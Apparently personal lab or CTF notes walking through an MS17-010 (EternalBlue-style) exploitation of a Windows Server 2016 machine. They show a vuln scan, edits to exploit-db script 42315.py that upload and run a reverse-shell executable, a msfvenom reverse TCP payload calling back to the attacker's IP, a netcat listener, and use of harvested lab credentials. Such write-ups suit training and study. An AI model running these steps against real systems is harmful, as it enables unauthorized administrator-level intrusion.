<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>ms17-010</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>ms17-010</h1><br/><p>We begin by doing nmap again, but this time we use <strong>vuln</strong> script to check for vulnerabilities.</p><p></p><p><em><strong>nmap --script vuln 10.10.20.25 </strong></em>	[Note: Generally we should include ports with -p for efficiency]</p><p></p><p>This will show <strong>ms17-010</strong> vulnerability.</p><p></p><p><strong>Note: </strong>As the server is not running windows 7, we cannot run “<strong>eternalblue</strong>” exploit directly from metasploit framework.</p><p></p><p>Thus, we search for ms17-010 in exploit database.</p><p></p><p><img src="images/183-1.png" alt="images/183-1.png" /></p><p></p><p>We will use the python code that supports <strong>Microsoft Windows 2016 R2</strong> (This was hinted in OS detection of initial nmap scan.</p><p></p><p>Get the file to user working directory using.</p><p></p><p><em><strong>searchsploit -m windows/remote/42315.py</strong></em></p><p></p><p><strong>Note: </strong>This will require <strong>python2</strong></p><p>(So impacket also has be installed for python2. [pip2 install impacket])</p><p></p><p>Then examine the file and edit the following:</p><p> 	</p><p>1) We need to give values in username and password.</p><p>Luckily we have 2 usernames and passwords.</p><p><strong></strong></p><p><strong>Note:</strong> While enumerating the machine earlier, I tried to RDP into the machine using the gained credentials.</p><p>Both the users couldn&#39;t login. However, the error message of user <strong>Jill</strong> suggested that her password is expired.</p><p>Thus for our python program lets start with <strong>Bob</strong> and <strong>!P@$$W0rD!123</strong></p><p></p><p>2) Starting from Line 916. Comment out the following. The following lines are used to create a file bane “pwned.txt” as a POC. However, we need a reverse shell, so we will replace it the following.</p><p></p><p><em>	#print(&#39;creating file c:\\pwned.txt on the target&#39;)</em></p><p><em>	#tid2 = smbConn.connectTree(&#39;C$&#39;)</em></p><p><em>	#fid2 = smbConn.createFile(tid2, &#39;/pwned.txt&#39;)</em></p><p><em>	#smbConn.closeFile(tid2, fid2)</em></p><p><em>	#smbConn.disconnectTree(tid2)</em></p><p></p><p><em><strong>	smb_send_file(smbConn, &#39;rshell.exe&#39;, &#39;C&#39;, &#39;/rshell.exe&#39; )</strong></em></p><p><em><strong>	service_exec(conn, r&#39;C:\rshell.exe&#39;)</strong></em></p><p></p><p>3) Create a reverse shell using msfvenom</p><p></p><p><em><strong>msfvenom -p windows/x64/shell_reverse_tcp  LHOST=10.11.72.31 LPORT=7777 -f exe -o rshell.exe</strong></em></p><p></p><p>3) Get this prequisite file.</p><p><em><strong>wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py</strong></em></p><p></p><p>Keep both the <strong>42315.py, mysmb.py and rshell.exe</strong> in the same directory and run the exploit as follows:</p><p></p><p>4) Start a netcat listner: <em><strong>nc -lvnp 7777</strong></em></p><p></p><p>5) Run the exploit using python2: </p><p></p><p><em><strong>python2 42315.py 10.10.227.128</strong></em></p><p><em><strong></strong></em></p><p></p><p>We will get a reverse shell in our netcat listener. (we will directly foothold with admin access)</p><p></p><p><img src="images/183-2.png" alt="images/183-2.png" /></p><p></p><p></p><p>Thanks !!</p></div>
</body>
</html>
